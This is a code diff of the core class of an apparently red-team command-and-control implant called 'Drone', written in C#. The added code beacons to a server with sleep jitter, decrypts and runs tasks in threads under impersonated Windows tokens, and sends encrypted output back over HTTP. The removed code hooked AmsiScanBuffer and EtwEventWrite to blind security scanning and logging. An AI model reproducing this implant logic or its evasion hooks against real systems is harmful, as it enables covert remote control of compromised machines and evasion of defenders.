@@ -3,318 +3,245 @@ using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Linq;
 using System.Reflection;
-using System.Text;
+using System.Security.Principal;
 using System.Threading;
 using System.Threading.Tasks;
 
-using DInvoke.DynamicInvoke;
-
-using Drone.Handlers;
-using Drone.Models;
-using Drone.Utilities;
-
-using MinHook;
-using Win32 = Drone.Utilities.Win32;
+using Drone.Commands;
+using Drone.CommModules;
+using Drone.Interfaces;
 
 namespace Drone;
 
-public class Drone
+public sealed class Drone
 {
-    public Config Config { get; private set; }
-    public Metadata Metadata { get; private set; }
+    public IConfig Config { get; } = new Config();
     
-    private Handler _handler;
+    private Metadata _metadata;
+    private ICommModule _commModule;
     
-    private readonly HookEngine _engine = new();
-    private readonly ManualResetEvent _signal = new(false);
+    private readonly CancellationTokenSource _token = new();
 
     private readonly List<DroneCommand> _commands = new();
-    private readonly ConcurrentDictionary<string, CancellationTokenSource> _tokens = new();
-    private readonly ConcurrentQueue<DroneTaskResponse> _outbound = new();
-    
-    private readonly List<Handler> _children = new();
-    private readonly ConcurrentQueue<C2Message> _relay = new();
+    private readonly Dictionary<string, CancellationTokenSource> _taskTokens = new();
 
-    public void Start()
+    private readonly ConcurrentQueue<C2Frame> _outbound = new();
+
+    public async Task Run()
     {
-        Config = new Config();
-        Metadata = Helpers.GenerateMetadata();
+        // generate metadata
+        _metadata = await Metadata.Generate();
 
+        // load commands classes
         LoadCommands();
-        SetupHookEngine();
 
-        _handler = GetHandler();
-        _handler.Init(Metadata, Config);
-
-        _handler.OnMessagesReceived += HandleC2Messages;
-        _handler.Start().ConfigureAwait(false);
+        // create comm module
+        _commModule = GetCommModule();
+        _commModule.Init(_metadata);
         
-        _signal.WaitOne();
-    }
-
-    private async Task HandleC2Messages(IEnumerable<C2Message> messages)
-    {
-        // hook
-        _engine.EnableHooks();
-
-        foreach (var message in messages)
-            await HandleC2Message(message);
-        
-        // unhook
-        _engine.DisableHooks();
-
-        await FlushOutboundQueue();
-    }
-
-    private async Task HandleC2Message(C2Message message)
-    {
-        if (!string.IsNullOrWhiteSpace(message.DroneId) && !message.DroneId.Equals(Metadata.Id))
+        // run
+        while (!_token.IsCancellationRequested)
         {
-            _children.ForEach(h => h.SendMessages(new[] { message }));
-            return;
-        }
-        
-        // decrypt message
-        IEnumerable<DroneTask> tasks;
-        
-        try
-        {
-            tasks = Crypto.DecryptObject<IEnumerable<DroneTask>>(message.Iv, message.Data, message.Checksum);
-        }
-        catch
-        {
-            return;
-        }
-
-        await HandleDroneTasks(tasks);
-    }
-
-    private async Task HandleDroneTasks(IEnumerable<DroneTask> tasks)
-    {
-        foreach (var task in tasks)
-            await HandleDroneTask(task);
-    }
-
-    private async Task HandleDroneTask(DroneTask task)
-    {
-        var tokenSource = new CancellationTokenSource();
+            // get frames
+            var inbound = await _commModule.ReadFrames();
             
-        // ignore if already present
-        if (!_tokens.ContainsKey(task.Id))
-        {
-            // loop until added
-            while (!_tokens.TryAdd(task.Id, tokenSource))
-                await Task.Delay(10, tokenSource.Token);
-        }
+            // process them
+            HandleInboundFrames(inbound);
             
+            // flush outbound queue
+            await FlushOutboundQueue();
+            
+            // sleep
+            var interval = Config.Get<int>(Setting.SLEEP_INTERVAL);
+            var jitter = Config.Get<int>(Setting.SLEEP_JITTER);
+
+            try
+            {
+                // this will throw if the token is cancelled
+                await Task.Delay(Helpers.CalculateSleepTime(interval, jitter), _token.Token);
+            }
+            catch (TaskCanceledException)
+            {
+                // ignore
+            }
+        }
+        
+        _token.Dispose();
+    }
+
+    private void HandleInboundFrames(IEnumerable<C2Frame> frames)
+    {
+        foreach (var frame in frames)
+            HandleFrame(frame);
+    }
+
+    private void HandleFrame(C2Frame frame)
+    {
+        switch (frame.FrameType)
+        {
+            case FrameType.NOP:
+                break;
+            
+            case FrameType.CHECKIN:
+                break;
+
+            case FrameType.TASK:
+            {
+                var task = Crypto.Decrypt<DroneTask>(frame.Value);
+                HandleTask(task);
+                
+                break;
+            }
+
+            case FrameType.TASK_OUTPUT:
+                break;
+
+            case FrameType.EXIT:
+                break;
+
+            case FrameType.TASK_CANCEL:
+            {
+                var taskId = Crypto.Decrypt<string>(frame.Value);
+                CancelTask(taskId);
+                
+                break;
+            }
+
+            default:
+                throw new ArgumentOutOfRangeException();
+        }
+    }
+
+    private void HandleTask(DroneTask task)
+    {
+        // get the command
         var command = _commands.FirstOrDefault(c => c.Command == task.Command);
-            
+
         if (command is null)
         {
-            await SendError(task, $"Unknown command \"{task.Command}\".");
-
-            while (!_tokens.TryRemove(task.Id, out _))
-                await Task.Delay(10, tokenSource.Token);
+            var e = new ArgumentOutOfRangeException(nameof(command));
+            SendTaskError(task.Id, e.Message);
             
-            tokenSource.Cancel();
-            tokenSource.Dispose();
-
             return;
         }
-            
-        // wait or not
-        if (command.Blocking)
-        {
-            await ExecuteDroneCommand(command, task, tokenSource.Token);
-        }
-        else
-        {
-            _ = Task.Run(
-                async () => await ExecuteDroneCommand(command, task, tokenSource.Token),
-                tokenSource.Token);
-        }
+        
+        // execute
+        if (command.Threaded) ExecuteTaskThreaded(command, task);
+        else ExecuteTask(command, task);
     }
-    
-    private async Task ExecuteDroneCommand(DroneCommand command, DroneTask task, CancellationToken token)
+
+    private void ExecuteTask(IDroneCommand command, DroneTask task)
     {
         try
         {
-            // always block here
-            await command.Execute(task, token);
-        }
-        catch (OperationCanceledException)
-        {
-            await SendTaskComplete(task);
+            // execute without a token
+            command.Execute(task, CancellationToken.None);
         }
         catch (Exception e)
         {
-            await SendError(task, e.Message);
+            SendTaskError(task.Id, e.Message);
         }
+    }
 
-        // token isn't in dict, just return
-        if (!_tokens.ContainsKey(task.Id))
+    private void ExecuteTaskThreaded(IDroneCommand command, DroneTask task)
+    {
+        // create a new token
+        var tokenSource = new CancellationTokenSource();
+        
+        // add to dict
+        _taskTokens.Add(task.Id, tokenSource);
+        
+        // get the current identity
+        using var identity = ImpersonationToken == IntPtr.Zero
+            ? WindowsIdentity.GetCurrent()
+            : new WindowsIdentity(ImpersonationToken);
+        
+        // create impersonation context
+        using var context = identity.Impersonate();
+        
+        var thread = new Thread(() =>
+        {
+            // wrap this in a try/catch
+            try
+            {
+                // this blocks inside the thread
+                command.Execute(task, tokenSource.Token);
+            }
+            catch (TaskCanceledException)
+            {
+                // send a task complete
+                SendTaskComplete(task.Id);
+            }
+            catch (Exception e)
+            {
+                SendTaskError(task.Id, e.Message);
+            }
+            finally
+            {
+                // make sure the token is disposed and removed
+                if (_taskTokens.ContainsKey(task.Id))
+                {
+                    _taskTokens[task.Id].Dispose();
+                    _taskTokens.Remove(task.Id);
+                }
+            }
+        });
+        
+        thread.Start();
+    }
+
+    public void CancelTask(string taskId)
+    {
+        if (!_taskTokens.ContainsKey(taskId))
             return;
-
-        // loop until removed
-        CancellationTokenSource tokenSource;
         
-        while (!_tokens.TryRemove(task.Id, out tokenSource))
-            await Task.Delay(10, token);
-
-        tokenSource.Dispose();
+        // cancel the token
+        _taskTokens[taskId].Cancel();
     }
 
-    public async Task SendError(DroneTask task, string error)
+    public void SendTaskRunning(string taskId)
     {
-        var taskOutput = new DroneTaskResponse
-        {
-            TaskId = task.Id,
-            Status = DroneTaskStatus.Aborted,
-            Module = 0x01,
-            Output = Encoding.UTF8.GetBytes(error)
-        };
-        
-        await SendDroneTaskOutput(taskOutput);
+        SendTaskOutput(new TaskOutput(taskId, TaskStatus.RUNNING));
     }
 
-    public async Task SendOutput(DroneTask task, string output, bool stillRunning = false)
+    public void SendTaskOutput(string taskId, string output)
     {
-        var taskOutput = new DroneTaskResponse
-        {
-            TaskId = task.Id,
-            Status = stillRunning ? DroneTaskStatus.Running : DroneTaskStatus.Complete,
-            Module = 0x01,
-            Output = Encoding.UTF8.GetBytes(output)
-        };
-
-        await SendDroneTaskOutput(taskOutput);
+        SendTaskOutput(new TaskOutput(taskId, output));
     }
 
-    public async Task SendTaskRunning(DroneTask task)
+    public void SendTaskComplete(string taskId)
     {
-        var response = new DroneTaskResponse
-        {
-            TaskId = task.Id,
-            Status = DroneTaskStatus.Running,
-            Module = 0x01
-        };
-        
-        await SendDroneTaskOutput(response);
-    }
-
-    public async Task SendTaskComplete(DroneTask task)
-    {
-        var output = new DroneTaskResponse
-        {
-            TaskId = task.Id,
-            Status = DroneTaskStatus.Complete,
-            Module = 0x01
-        };
-        
-        await SendDroneTaskOutput(output);
+        SendTaskOutput(new TaskOutput(taskId, TaskStatus.COMPLETE));
     }
     
-    public async Task SendDroneTaskOutput(DroneTaskResponse taskResponse)
+    public void SendTaskError(string taskId, string error)
     {
-        _outbound.Enqueue(taskResponse);
-        await Task.CompletedTask;
+        var taskOutput = new TaskOutput(taskId, TaskStatus.ABORTED, error);
+        SendTaskOutput(taskOutput);
+    }
+
+    public void SendTaskOutput(TaskOutput output)
+    {
+        var frame = new C2Frame(FrameType.TASK_OUTPUT, Crypto.Encrypt(output));
+        SendC2Frame(frame);
+    }
+
+    public void SendC2Frame(C2Frame frame)
+    {
+        _outbound.Enqueue(frame);
     }
 
     private async Task FlushOutboundQueue()
     {
-        List<C2Message> messages = new();
-
-        if (!_outbound.IsEmpty)
-        {
-            List<DroneTaskResponse> outputs = new();
-
-            while (_outbound.TryDequeue(out var output))
-                outputs.Add(output);
-
-            var enc = Crypto.EncryptObject(outputs);
-            
-            messages.Add(new C2Message
-            {
-                DroneId = Metadata.Id,
-                Iv = enc.iv,
-                Data = enc.data,
-                Checksum = enc.checksum
-            });
-        }
-
-        if (!messages.Any())
+        if (_outbound.IsEmpty)
             return;
         
-        await _handler.SendMessages(messages);
-    }
+        List<C2Frame> frames = new();
 
-    public bool CancelTask(string taskId)
-    {
-        // false if thread isn't there
-        if (!_tokens.ContainsKey(taskId))
-            return false;
+        while (_outbound.TryDequeue(out var frame))
+            frames.Add(frame);
 
-        // loop until we have it
-        CancellationTokenSource tokenSource;
-        while (!_tokens.TryRemove(taskId, out tokenSource))
-            Thread.Sleep(10);
-
-        // cancel the token
-        tokenSource.Cancel();
-        tokenSource.Dispose();
-        
-        return true;
-    }
-
-    public void AddChildHandler(Handler handler)
-    {
-        handler.OnMessagesReceived += RelayChildMessages;
-        _children.Add(handler);
-    }
-
-    public void RemoveChildHandler(Handler handler)
-    {
-        handler.OnMessagesReceived -= RelayChildMessages;
-        _children.Remove(handler);
-    }
-
-    private async Task RelayChildMessages(IEnumerable<C2Message> messages)
-    {
-        // send them
-        await _handler.SendMessages(messages);
-    }
-
-    public async Task Stop(DroneTask task)
-    {
-        // send notification immediately
-        var responses = new DroneTaskResponse[]
-        {
-            new()
-            {
-                TaskId = task.Id,
-                Module = 0x22,
-                Status = DroneTaskStatus.Complete
-            }
-        };
-
-        var enc = Crypto.EncryptObject(responses);
-
-        await _handler.SendMessages(new C2Message[]
-        {
-            new()
-            {
-                DroneId = Metadata.Id,
-                Iv = enc.iv,
-                Data = enc.data,
-                Checksum = enc.checksum
-            }
-        });
-        
-        // give things time to flush out
-        await Task.Delay(new TimeSpan(0, 0, 10));
-
-        _handler.Stop();
-        _signal.Set();
+        await _commModule.SendFrames(frames.ToArray());
     }
 
     private void LoadCommands()
@@ -333,37 +260,29 @@ public class Drone
         }
     }
 
-    private void SetupHookEngine()
-    {
-        // force amsi.dll to load
-        var hAmsi = Generic.LoadModuleFromDisk("amsi.dll");
-        
-        var hAsb = Generic.GetExportAddress(hAmsi, "AmsiScanBuffer");
-        var hEew = Generic.GetLibraryAddress("ntdll.dll", "EtwEventWrite");
-
-        _engine.CreateHook(hAsb, new Delegates.AmsiScanBuffer(Detours.AmsiScanBuffer));
-        _engine.CreateHook(hEew, new Delegates.EtwEventWrite(Detours.EtwEventWrite));
-    }
-
-    private IntPtr _token;
+    private IntPtr _impersonationToken;
     public IntPtr ImpersonationToken
     {
-        get => _token;
+        get => _impersonationToken;
         set
         {
-            try
-            {
-                Win32.CloseHandle(_token);
-            }
-            catch
-            {
-                // ignore
-            }
+            // ensure the handle is closed first
+            if (_impersonationToken != IntPtr.Zero)
+                Interop.Methods.CloseHandle(_impersonationToken);
             
-            _token = value;
+            _impersonationToken = value;
         }
     }
-    
-    private static Handler GetHandler()
-        => new HttpHandler();
+
+    public void Stop()
+    {
+        // send an exit frame with metadata
+        _outbound.Enqueue(new C2Frame(FrameType.EXIT, Crypto.Encrypt(_metadata)));
+
+        // cancel main token
+        _token.Cancel();
+    }
+
+    private static ICommModule GetCommModule()
+        => new HttpCommModule();
 }
